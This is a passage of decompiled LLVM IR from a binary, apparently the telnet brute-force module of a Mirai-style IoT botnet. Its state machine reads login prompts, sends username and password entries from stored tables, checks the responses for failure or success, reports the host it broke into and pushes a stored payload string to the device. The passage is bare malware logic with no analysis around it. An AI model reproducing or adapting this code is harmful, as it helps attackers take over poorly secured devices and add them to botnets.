dec_label_pc_e84c:                                ; preds = %dec_label_pc_e7d0
  %v2_e864 = load i32, i32* %v1_e6f8, align 4
  store i32 %v2_e864, i32* @r4, align 4
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v2_e880 = load i32, i32* %v1_e6f8, align 4
  store i32 %v2_e880, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_e890 = call i32 @__libc_fcntl(i32 %v2_e880, i32 3)
  %v1_e898 = and i32 %v2_e890, -2049
  store i32 %v1_e898, i32* @r3, align 4
  %v0_e89c = load i32, i32* @r4, align 4
  store i32 %v1_e898, i32* %r2.global-to-local, align 4
  %v2_e8a8 = call i32 @__libc_fcntl(i32 %v0_e89c, i32 4)
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v3_e8cc = call i32 @advance_state(i32* nonnull %v1_e6f8, i32 2)
  br label %dec_label_pc_f318

dec_label_pc_e8d4:                                ; preds = %dec_label_pc_e6e0
  %v3_e8d8 = icmp eq i32 %v5_e7b8, -1
  br i1 %v3_e8d8, label %dec_label_pc_e8e0, label %dec_label_pc_e904

dec_label_pc_e8e0:                                ; preds = %dec_label_pc_e8d4
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v3_e8fc = call i32 @reset_telstate(i32 %v2_e1e0, i32 %v3_e0bc, i32 %v3_e1d4)
  br label %dec_label_pc_f318

dec_label_pc_e904:                                ; preds = %dec_label_pc_e8d4
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v2_e920 = add i32 %v2_e1dc, %v2_e91c
  %v1_e924 = inttoptr i32 %v2_e920 to i32*
  %v2_e924 = load i32, i32* %v1_e924, align 4
  %v1_e928 = add i32 %v2_e924, 5
  store i32 %v1_e928, i32* @r4, align 4
  %v2_e930 = call i32 @__GI_time(i32* null)
  %v0_e938 = load i32, i32* @r4, align 4
  %v3_e938 = icmp ult i32 %v0_e938, %v2_e930
  br i1 %v3_e938, label %dec_label_pc_e940, label %dec_label_pc_f318

dec_label_pc_e940:                                ; preds = %dec_label_pc_e904
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v3_e95c = call i32 @reset_telstate(i32 %v2_e1e0, i32 %v3_e0bc, i32 %v3_e1d4)
  br label %dec_label_pc_f318

dec_label_pc_e964:                                ; preds = %dec_label_pc_e22c
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v1_e97c = inttoptr i32 %v2_e1e0 to i32*
  %v2_e97c = load i32, i32* %v1_e97c, align 4
  store i32 %v2_e97c, i32* %ip.global-to-local, align 4
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v2_e99c = add i32 %v2_e1dc, %v2_e998
  %v1_e9a0 = inttoptr i32 %v2_e99c to i32*
  %v2_e9a0 = load i32, i32* %v1_e9a0, align 4
  store i32 %v2_e9a0, i32* %r2.global-to-local, align 4
  %v1_e9a8 = load i32, i32* @sp, align 4
  %v2_e9a8 = inttoptr i32 %v1_e9a8 to i32*
  store i32 ptrtoint (i32* @global_var_2a238 to i32), i32* %v2_e9a8, align 4
  %v0_e9ac = load i32, i32* %ip.global-to-local, align 4
  %v4_e9b8 = inttoptr i32 %v2_e9a0 to i8*
  %v5_e9b8 = call i32 @read_until_response(i32 %v0_e9ac, i32 %arg1, i8* %v4_e9b8, i32 512)
  %v2_e9c0 = icmp eq i32 %v5_e9b8, 0
  br i1 %v2_e9c0, label %dec_label_pc_ea50, label %dec_label_pc_e9c8

dec_label_pc_e9c8:                                ; preds = %dec_label_pc_e964
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v2_e9e4 = add i32 %v2_e1e0, 24
  %v1_e9e8 = inttoptr i32 %v2_e9e4 to i32*
  %v2_e9e8 = load i32, i32* %v1_e9e8, align 4
  %v1_e9f0 = call i32 @contains_fail(i32 %v2_e9e8)
  %v2_e9f8 = icmp eq i32 %v1_e9f0, 0
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  br i1 %v2_e9f8, label %dec_label_pc_ea28, label %dec_label_pc_ea00

dec_label_pc_ea00:                                ; preds = %dec_label_pc_e9c8
  %v3_ea20 = call i32 @advance_state(i32* %v1_e97c, i32 0)
  br label %dec_label_pc_f318

dec_label_pc_ea28:                                ; preds = %dec_label_pc_e9c8
  %v3_ea48 = call i32 @advance_state(i32* %v1_e97c, i32 3)
  br label %dec_label_pc_f318

dec_label_pc_ea50:                                ; preds = %dec_label_pc_e964
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v2_ea70 = load i32, i32* %v1_e1e8, align 4
  %v1_ea74 = add i32 %v2_ea70, 7
  store i32 %v1_ea74, i32* @r4, align 4
  %v2_ea7c = call i32 @__GI_time(i32* null)
  %v0_ea84 = load i32, i32* @r4, align 4
  %v3_ea84 = icmp ult i32 %v0_ea84, %v2_ea7c
  br i1 %v3_ea84, label %dec_label_pc_ea8c, label %dec_label_pc_f318

dec_label_pc_ea8c:                                ; preds = %dec_label_pc_ea50
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v3_eaa8 = call i32 @reset_telstate(i32 %v2_e1e0, i32 %v3_e0bc, i32 %v3_e1d4)
  br label %dec_label_pc_f318

dec_label_pc_eab0:                                ; preds = %dec_label_pc_e22c
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v1_eac8 = inttoptr i32 %v2_e1e0 to i32*
  %v2_eac8 = load i32, i32* %v1_eac8, align 4
  store i32 %v2_eac8, i32* @r4, align 4
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v1_eaec = add i32 %v2_e1e0, 10
  %v2_eaec = inttoptr i32 %v1_eaec to i8*
  %v3_eaec = load i8, i8* %v2_eaec, align 2
  %v4_eaec = zext i8 %v3_eaec to i32
  store i32 %v4_eaec, i32* %r2.global-to-local, align 4
  %v4_eaf8 = mul nuw nsw i32 %v4_eaec, 4
  %v5_eaf8 = add i32 %v4_eaf8, ptrtoint ([6 x i8*]* @global_var_2a1f4.505 to i32)
  %v6_eaf8 = inttoptr i32 %v5_eaf8 to i32*
  %v7_eaf8 = load i32, i32* %v6_eaf8, align 4
  store i32 %v7_eaf8, i32* @r5, align 4
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v3_eb1c = load i8, i8* %v2_eaec, align 2
  %v4_eb1c = zext i8 %v3_eb1c to i32
  store i32 %v4_eb1c, i32* %r2.global-to-local, align 4
  %v4_eb28 = mul nuw nsw i32 %v4_eb1c, 4
  %v5_eb28 = add i32 %v4_eb28, ptrtoint ([6 x i8*]* @global_var_2a1f4.505 to i32)
  %v6_eb28 = inttoptr i32 %v5_eb28 to i32*
  %v7_eb28 = load i32, i32* %v6_eb28, align 4
  %v1_eb2c = inttoptr i32 %v7_eb28 to i8*
  %v3_eb30 = call i32 @strlen(i8* %v1_eb2c)
  %v0_eb38 = load i32, i32* @r4, align 4
  %v0_eb3c = load i32, i32* @r5, align 4
  store i32 %v3_eb30, i32* %r2.global-to-local, align 4
  %v4_eb48 = call i32 @__libc_send(i32 %v0_eb38, i32 %v0_eb3c, i32 %v3_eb30, i32 16384)
  %v1_eb50 = icmp slt i32 %v4_eb48, 0
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  br i1 %v1_eb50, label %dec_label_pc_eb58, label %dec_label_pc_eb7c

dec_label_pc_eb58:                                ; preds = %dec_label_pc_eab0
  %v3_eb74 = call i32 @reset_telstate(i32 %v2_e1e0, i32 %v3_e0bc, i32 %v3_e1d4)
  br label %dec_label_pc_f318

dec_label_pc_eb7c:                                ; preds = %dec_label_pc_eab0
  %v2_eb94 = load i32, i32* %v1_eac8, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_eba8 = call i32 @__libc_send(i32 %v2_eb94, i32 ptrtoint ([3 x i8]* @global_var_1fa98.507 to i32), i32 2, i32 16384)
  %v1_ebb0 = icmp slt i32 %v5_eba8, 0
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  br i1 %v1_ebb0, label %dec_label_pc_ebb8, label %dec_label_pc_ebdc

dec_label_pc_ebb8:                                ; preds = %dec_label_pc_eb7c
  %v3_ebd4 = call i32 @reset_telstate(i32 %v2_e1e0, i32 %v3_e0bc, i32 %v3_e1d4)
  br label %dec_label_pc_f318

dec_label_pc_ebdc:                                ; preds = %dec_label_pc_eb7c
  %v3_ebfc = call i32 @advance_state(i32* nonnull %v1_eac8, i32 4)
  br label %dec_label_pc_f318

dec_label_pc_ec04:                                ; preds = %dec_label_pc_e22c
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v1_ec1c = inttoptr i32 %v2_e1e0 to i32*
  %v2_ec1c = load i32, i32* %v1_ec1c, align 4
  store i32 %v2_ec1c, i32* %ip.global-to-local, align 4
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v2_ec3c = add i32 %v2_e1dc, %v2_e998
  %v1_ec40 = inttoptr i32 %v2_ec3c to i32*
  %v2_ec40 = load i32, i32* %v1_ec40, align 4
  store i32 %v2_ec40, i32* %r2.global-to-local, align 4
  %v1_ec48 = load i32, i32* @sp, align 4
  %v2_ec48 = inttoptr i32 %v1_ec48 to i32*
  store i32 ptrtoint (i32* @global_var_2a238 to i32), i32* %v2_ec48, align 4
  %v0_ec4c = load i32, i32* %ip.global-to-local, align 4
  %v4_ec58 = inttoptr i32 %v2_ec40 to i8*
  %v5_ec58 = call i32 @read_until_response(i32 %v0_ec4c, i32 %arg1, i8* %v4_ec58, i32 512)
  %v2_ec60 = icmp eq i32 %v5_ec58, 0
  br i1 %v2_ec60, label %dec_label_pc_ecf0, label %dec_label_pc_ec68

dec_label_pc_ec68:                                ; preds = %dec_label_pc_ec04
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v2_ec84 = add i32 %v2_e1e0, 24
  %v1_ec88 = inttoptr i32 %v2_ec84 to i32*
  %v2_ec88 = load i32, i32* %v1_ec88, align 4
  %v1_ec90 = call i32 @contains_fail(i32 %v2_ec88)
  %v2_ec98 = icmp eq i32 %v1_ec90, 0
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  br i1 %v2_ec98, label %dec_label_pc_ecc8, label %dec_label_pc_eca0

dec_label_pc_eca0:                                ; preds = %dec_label_pc_ec68
  %v3_ecc0 = call i32 @advance_state(i32* %v1_ec1c, i32 0)
  br label %dec_label_pc_f318

dec_label_pc_ecc8:                                ; preds = %dec_label_pc_ec68
  %v3_ece8 = call i32 @advance_state(i32* %v1_ec1c, i32 5)
  br label %dec_label_pc_f318

dec_label_pc_ecf0:                                ; preds = %dec_label_pc_ec04
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v2_ed10 = load i32, i32* %v1_e1e8, align 4
  %v1_ed14 = add i32 %v2_ed10, 3
  store i32 %v1_ed14, i32* @r4, align 4
  %v2_ed1c = call i32 @__GI_time(i32* null)
  %v0_ed24 = load i32, i32* @r4, align 4
  %v3_ed24 = icmp ult i32 %v0_ed24, %v2_ed1c
  br i1 %v3_ed24, label %dec_label_pc_ed2c, label %dec_label_pc_f318

dec_label_pc_ed2c:                                ; preds = %dec_label_pc_ecf0
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v3_ed48 = call i32 @reset_telstate(i32 %v2_e1e0, i32 %v3_e0bc, i32 %v3_e1d4)
  br label %dec_label_pc_f318

dec_label_pc_ed50:                                ; preds = %dec_label_pc_e22c
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v1_ed68 = inttoptr i32 %v2_e1e0 to i32*
  %v2_ed68 = load i32, i32* %v1_ed68, align 4
  store i32 %v2_ed68, i32* @r4, align 4
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v1_ed8c = add i32 %v2_e1e0, 11
  %v2_ed8c = inttoptr i32 %v1_ed8c to i8*
  %v3_ed8c = load i8, i8* %v2_ed8c, align 1
  %v4_ed8c = zext i8 %v3_ed8c to i32
  store i32 %v4_ed8c, i32* %r2.global-to-local, align 4
  %v4_ed98 = mul nuw nsw i32 %v4_ed8c, 4
  %v5_ed98 = add i32 %v4_ed98, ptrtoint ([3 x i8*]* @global_var_2a200.509 to i32)
  %v6_ed98 = inttoptr i32 %v5_ed98 to i32*
  %v7_ed98 = load i32, i32* %v6_ed98, align 4
  store i32 %v7_ed98, i32* @r5, align 4
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v3_edbc = load i8, i8* %v2_ed8c, align 1
  %v4_edbc = zext i8 %v3_edbc to i32
  store i32 %v4_edbc, i32* %r2.global-to-local, align 4
  %v4_edc8 = mul nuw nsw i32 %v4_edbc, 4
  %v5_edc8 = add i32 %v4_edc8, ptrtoint ([3 x i8*]* @global_var_2a200.509 to i32)
  %v6_edc8 = inttoptr i32 %v5_edc8 to i32*
  %v7_edc8 = load i32, i32* %v6_edc8, align 4
  %v1_edcc = inttoptr i32 %v7_edc8 to i8*
  %v3_edd0 = call i32 @strlen(i8* %v1_edcc)
  %v0_edd8 = load i32, i32* @r4, align 4
  %v0_eddc = load i32, i32* @r5, align 4
  store i32 %v3_edd0, i32* %r2.global-to-local, align 4
  %v4_ede8 = call i32 @__libc_send(i32 %v0_edd8, i32 %v0_eddc, i32 %v3_edd0, i32 16384)
  %v1_edf0 = icmp slt i32 %v4_ede8, 0
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  br i1 %v1_edf0, label %dec_label_pc_edf8, label %dec_label_pc_ee1c

dec_label_pc_edf8:                                ; preds = %dec_label_pc_ed50
  %v3_ee14 = call i32 @reset_telstate(i32 %v2_e1e0, i32 %v3_e0bc, i32 %v3_e1d4)
  br label %dec_label_pc_f318

dec_label_pc_ee1c:                                ; preds = %dec_label_pc_ed50
  %v2_ee34 = load i32, i32* %v1_ed68, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_ee48 = call i32 @__libc_send(i32 %v2_ee34, i32 ptrtoint ([3 x i8]* @global_var_1fa98.507 to i32), i32 2, i32 16384)
  %v1_ee50 = icmp slt i32 %v5_ee48, 0
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  br i1 %v1_ee50, label %dec_label_pc_ee58, label %dec_label_pc_ee7c

dec_label_pc_ee58:                                ; preds = %dec_label_pc_ee1c
  %v3_ee74 = call i32 @reset_telstate(i32 %v2_e1e0, i32 %v3_e0bc, i32 %v3_e1d4)
  br label %dec_label_pc_f318

dec_label_pc_ee7c:                                ; preds = %dec_label_pc_ee1c
  %v3_ee9c = call i32 @advance_state(i32* nonnull %v1_ed68, i32 6)
  br label %dec_label_pc_f318

dec_label_pc_eea4:                                ; preds = %dec_label_pc_e22c
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v1_eebc = inttoptr i32 %v2_e1e0 to i32*
  %v2_eebc = load i32, i32* %v1_eebc, align 4
  store i32 %v2_eebc, i32* %ip.global-to-local, align 4
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v2_eedc = add i32 %v2_e1dc, %v2_e998
  %v1_eee0 = inttoptr i32 %v2_eedc to i32*
  %v2_eee0 = load i32, i32* %v1_eee0, align 4
  store i32 %v2_eee0, i32* %r2.global-to-local, align 4
  %v1_eee8 = load i32, i32* @sp, align 4
  %v2_eee8 = inttoptr i32 %v1_eee8 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_2a27c.511 to i32), i32* %v2_eee8, align 4
  %v0_eeec = load i32, i32* %ip.global-to-local, align 4
  %v4_eef8 = inttoptr i32 %v2_eee0 to i8*
  %v5_eef8 = call i32 @read_until_response(i32 %v0_eeec, i32 %arg1, i8* %v4_eef8, i32 512)
  %v2_ef00 = icmp eq i32 %v5_eef8, 0
  br i1 %v2_ef00, label %dec_label_pc_f11c, label %dec_label_pc_ef08

dec_label_pc_ef08:                                ; preds = %dec_label_pc_eea4
  store i32 %storemerge548, i32* @r4, align 4
  %v2_ef10 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ef24 = load i32, i32* @r4, align 4
  %v2_ef30 = mul i32 %v0_ef24, 28
  %v2_ef38 = add i32 %v2_e91c, %v2_ef30
  %v2_ef3c = inttoptr i32 %v2_ef38 to i32*
  store i32 %v2_ef10, i32* %v2_ef3c, align 4
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v2_ef60 = load i32, i32* %v1_eee0, align 4
  %v1_ef68 = call i32 @contains_fail(i32 %v2_ef60)
  %v2_ef70 = icmp eq i32 %v1_ef68, 0
  br i1 %v2_ef70, label %dec_label_pc_efa0, label %dec_label_pc_ef78

dec_label_pc_ef78:                                ; preds = %dec_label_pc_ef08
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v3_ef98 = call i32 @advance_state(i32* %v1_eebc, i32 0)
  br label %dec_label_pc_f318

dec_label_pc_efa0:                                ; preds = %dec_label_pc_ef08
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v2_efc0 = load i32, i32* %v1_eee0, align 4
  %v1_efc8 = call i32 @contains_success(i32 %v2_efc0)
  %v2_efd0 = icmp eq i32 %v1_efc8, 0
  br i1 %v2_efd0, label %dec_label_pc_f0f8, label %dec_label_pc_efd8

dec_label_pc_efd8:                                ; preds = %dec_label_pc_efa0
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v1_eff8 = add i32 %v2_e1e0, 9
  %v2_eff8 = inttoptr i32 %v1_eff8 to i8*
  %v3_eff8 = load i8, i8* %v2_eff8, align 1
  %v7_effc = icmp eq i8 %v3_eff8, 2
  br i1 %v7_effc, label %dec_label_pc_f004, label %dec_label_pc_f02c

dec_label_pc_f004:                                ; preds = %dec_label_pc_efd8
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v3_f024 = call i32 @advance_state(i32* %v1_eebc, i32 7)
  br label %dec_label_pc_f318

dec_label_pc_f02c:                                ; preds = %dec_label_pc_efd8
  %v2_f030 = load i32, i32* @global_var_2a530.50, align 4
  store i32 %v2_f030, i32* @r4, align 4
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v3_f050 = call i32 @get_telstate_host(i32 %v2_e1e0, i32 %v3_e0bc, i32 %v3_e1d4)
  store i32 %v3_f050, i32* %ip.global-to-local, align 4
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v1_f078 = add i32 %v2_e1e0, 10
  %v2_f078 = inttoptr i32 %v1_f078 to i8*
  %v3_f078 = load i8, i8* %v2_f078, align 2
  %v4_f078 = zext i8 %v3_f078 to i32
  store i32 %v4_f078, i32* %r2.global-to-local, align 4
  %v4_f084 = mul nuw nsw i32 %v4_f078, 4
  %v5_f084 = add i32 %v4_f084, ptrtoint ([6 x i8*]* @global_var_2a1f4.505 to i32)
  %v6_f084 = inttoptr i32 %v5_f084 to i32*
  %v7_f084 = load i32, i32* %v6_f084, align 4
  store i32 %v7_f084, i32* @lr, align 4
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v1_f0a8 = add i32 %v2_e1e0, 11
  %v2_f0a8 = inttoptr i32 %v1_f0a8 to i8*
  %v3_f0a8 = load i8, i8* %v2_f0a8, align 1
  %v4_f0a8 = zext i8 %v3_f0a8 to i32
  store i32 %v4_f0a8, i32* %r2.global-to-local, align 4
  %v4_f0b4 = mul nuw nsw i32 %v4_f0a8, 4
  %v5_f0b4 = add i32 %v4_f0b4, ptrtoint ([3 x i8*]* @global_var_2a200.509 to i32)
  %v6_f0b4 = inttoptr i32 %v5_f0b4 to i32*
  %v7_f0b4 = load i32, i32* %v6_f0b4, align 4
  %v1_f0b8 = load i32, i32* @sp, align 4
  %v2_f0b8 = inttoptr i32 %v1_f0b8 to i32*
  store i32 %v7_f0b4, i32* %v2_f0b8, align 4
  %v0_f0bc = load i32, i32* @r4, align 4
  %v0_f0c4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_f0c4, i32* @r2, align 4
  %v3_f0cc = call i32 @sockprintf(i32 %v0_f0bc, i32 ptrtoint ([23 x i8]* @global_var_1fa9c.514 to i32))
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v3_f0f0 = call i32 @advance_state(i32* %v1_eebc, i32 7)
  br label %dec_label_pc_f318

dec_label_pc_f0f8:                                ; preds = %dec_label_pc_efa0
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v3_f114 = call i32 @reset_telstate(i32 %v2_e1e0, i32 %v3_e0bc, i32 %v3_e1d4)
  br label %dec_label_pc_f318

dec_label_pc_f11c:                                ; preds = %dec_label_pc_eea4
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v2_f138 = add i32 %v2_e1dc, %v2_e91c
  %v1_f13c = inttoptr i32 %v2_f138 to i32*
  %v2_f13c = load i32, i32* %v1_f13c, align 4
  %v1_f140 = add i32 %v2_f13c, 7
  store i32 %v1_f140, i32* @r4, align 4
  %v2_f148 = call i32 @__GI_time(i32* null)
  %v0_f150 = load i32, i32* @r4, align 4
  %v3_f150 = icmp ult i32 %v0_f150, %v2_f148
  br i1 %v3_f150, label %dec_label_pc_f158, label %dec_label_pc_f318

dec_label_pc_f158:                                ; preds = %dec_label_pc_f11c
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v3_f174 = call i32 @reset_telstate(i32 %v2_e1e0, i32 %v3_e0bc, i32 %v3_e1d4)
  br label %dec_label_pc_f318

dec_label_pc_f1a8:                                ; preds = %dec_label_pc_e22c
  store i32 %storemerge548, i32* @r4, align 4
  %v2_f1b0 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_f1c4 = load i32, i32* @r4, align 4
  %v2_f1d0 = mul i32 %v0_f1c4, 28
  %v2_f1d8 = add i32 %v2_e91c, %v2_f1d0
  %v2_f1dc = inttoptr i32 %v2_f1d8 to i32*
  store i32 %v2_f1b0, i32* %v2_f1dc, align 4
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v1_f1f8 = inttoptr i32 %v2_e1e0 to i32*
  %v2_f1f8 = load i32, i32* %v1_f1f8, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_f20c = call i32 @__libc_send(i32 %v2_f1f8, i32 ptrtoint ([5 x i8]* @global_var_1fab4.516 to i32), i32 4, i32 16384)
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v2_f228 = load i32, i32* %v1_f1f8, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_f23c = call i32 @__libc_send(i32 %v2_f228, i32 ptrtoint ([8 x i8]* @global_var_1fabc.518 to i32), i32 7, i32 16384)
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v2_f258 = load i32, i32* %v1_f1f8, align 4
  store i32 %v2_f258, i32* @r4, align 4
  %v2_f260 = load i32, i32* bitcast ([430 x i8]** @global_var_2a1f0.521 to i32*), align 4
  store i32 %v2_f260, i32* @r5, align 4
  %v1_f26c = inttoptr i32 %v2_f260 to i8*
  %v3_f270 = call i32 @strlen(i8* %v1_f26c)
  %v0_f278 = load i32, i32* @r4, align 4
  %v0_f27c = load i32, i32* @r5, align 4
  store i32 %v3_f270, i32* %r2.global-to-local, align 4
  %v5_f288 = call i32 @__libc_send(i32 %v0_f278, i32 %v0_f27c, i32 %v3_f270, i32 16384)
  %v1_f290 = icmp slt i32 %v5_f288, 0
  br i1 %v1_f290, label %dec_label_pc_f298, label %dec_label_pc_f2bc

dec_label_pc_f298:                                ; preds = %dec_label_pc_f1a8
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v3_f2b4 = call i32 @reset_telstate(i32 %v2_e1e0, i32 %v3_e0bc, i32 %v3_e1d4)
  br label %dec_label_pc_f318

dec_label_pc_f2bc:                                ; preds = %dec_label_pc_f1a8
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v2_f2d8 = add i32 %v2_e1dc, %v2_e91c
  %v1_f2dc = inttoptr i32 %v2_f2d8 to i32*
  %v2_f2dc = load i32, i32* %v1_f2dc, align 4
  %v1_f2e0 = add i32 %v2_f2dc, 25
  store i32 %v1_f2e0, i32* @r4, align 4
  %v2_f2e8 = call i32 @__GI_time(i32* null)
  %v0_f2f0 = load i32, i32* @r4, align 4
  %v3_f2f0 = icmp ult i32 %v0_f2f0, %v2_f2e8
  br i1 %v3_f2f0, label %dec_label_pc_f2f8, label %dec_label_pc_f318

dec_label_pc_f2f8:                                ; preds = %dec_label_pc_f2bc
  store i32 %v3_e1d4, i32* %r2.global-to-local, align 4
  %v3_f314 = call i32 @reset_telstate(i32 %v2_e1e0, i32 %v3_e0bc, i32 %v3_e1d4)
  br label %dec_label_pc_f318

dec_label_pc_f318:                                ; preds = %dec_label_pc_e904, %dec_label_pc_ea50, %dec_label_pc_ecf0, %dec_label_pc_f11c, %dec_label_pc_f2bc, %dec_label_pc_e22c, %dec_label_pc_e4e0, %dec_label_pc_f298, %dec_label_pc_f158, %dec_label_pc_f0f8, %dec_label_pc_f02c, %dec_label_pc_f004, %dec_label_pc_ef78, %dec_label_pc_ee7c, %dec_label_pc_ee58, %dec_label_pc_edf8, %dec_label_pc_ed2c, %dec_label_pc_ecc8, %dec_label_pc_eca0, %dec_label_pc_ebdc, %dec_label_pc_ebb8, %dec_label_pc_eb58, %dec_label_pc_ea8c, %dec_label_pc_ea28, %dec_label_pc_ea00, %dec_label_pc_e940, %dec_label_pc_e8e0, %dec_label_pc_e84c, %dec_label_pc_e828, %dec_label_pc_e67c, %dec_label_pc_e658, %dec_label_pc_e4b4, %dec_label_pc_e45c, %dec_label_pc_f2f8
  %v1_f31c = add nuw nsw i32 %storemerge548, 1
  store i32 %v1_f31c, i32* %r2.global-to-local, align 4
  %v5_f330 = icmp slt i32 %v1_f31c, %arg2
  br i1 %v5_f330, label %dec_label_pc_e1c8, label %dec_label_pc_e1bc

; uselistorder directives
  uselistorder i32 %v1_f31c, { 2, 1, 0 }
  uselistorder i32 %v3_f270, { 1, 0 }
  uselistorder i32* %v1_eebc, { 1, 0, 2, 3 }
  uselistorder i32 %v3_edd0, { 1, 0 }
  uselistorder i32 %v3_eb30, { 1, 0 }
  uselistorder i32 %storemerge610, { 1, 0 }
  uselistorder i32 %v0_e334, { 1, 0 }
  uselistorder i32 %v2_e2c8, { 1, 0 }
  uselistorder i32 %v2_e2c4, { 1, 0, 2 }
  uselistorder i8* %v2_e29c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_e210, { 1, 0 }
  uselistorder i32* %v1_e1e8, { 1, 0, 2 }
  uselistorder i32 %v2_e1e0, { 35, 34, 36, 27, 28, 29, 30, 31, 32, 33, 24, 23, 25, 26, 21, 4, 22, 18, 17, 19, 20, 15, 3, 16, 13, 12, 11, 14, 6, 7, 1, 2, 8, 0, 10, 9, 5 }
  uselistorder i32 %v2_e1dc, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v3_e1d4, { 81, 82, 80, 78, 79, 77, 76, 75, 61, 62, 60, 65, 66, 73, 72, 71, 69, 70, 68, 67, 64, 74, 63, 59, 58, 56, 57, 54, 55, 53, 52, 51, 47, 48, 46, 50, 49, 45, 44, 42, 43, 40, 41, 39, 38, 37, 33, 34, 32, 36, 35, 31, 30, 28, 29, 27, 25, 26, 23, 22, 24, 21, 20, 19, 18, 17, 11, 9, 10, 8, 7, 6, 5, 4, 16, 15, 14, 13, 12, 3, 2, 1, 0 }
  uselistorder i32 %storemerge548, { 1, 4, 5, 7, 6, 3, 2, 0 }
  uselistorder i32 %v2_e91c, { 3, 0, 4, 1, 5, 2 }
  uselistorder i32 %v2_e6a4, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v1_e1a0, { 1, 2, 0 }
  uselistorder i32 %v1_e17c, { 2, 1, 0 }
  uselistorder i32 %storemerge457, { 1, 0 }
  uselistorder i32 %v3_e0bc, { 4, 3, 5, 6, 7, 9, 8, 10, 12, 11, 13, 16, 15, 14, 18, 0, 19, 17, 1, 22, 23, 24, 21, 2, 20 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-612, { 0, 2, 1 }
  uselistorder i32* %stack_var_-340, { 1, 0, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 107, 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 104, 105, 106, 102, 108, 109, 103, 101 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 35, { 1, 0 }
  uselistorder i32 ptrtoint ([3 x i8*]* @global_var_2a200.509 to i32), { 2, 0, 1 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_1fa98.507 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([6 x i8*]* @global_var_2a1f4.505 to i32), { 2, 0, 1 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
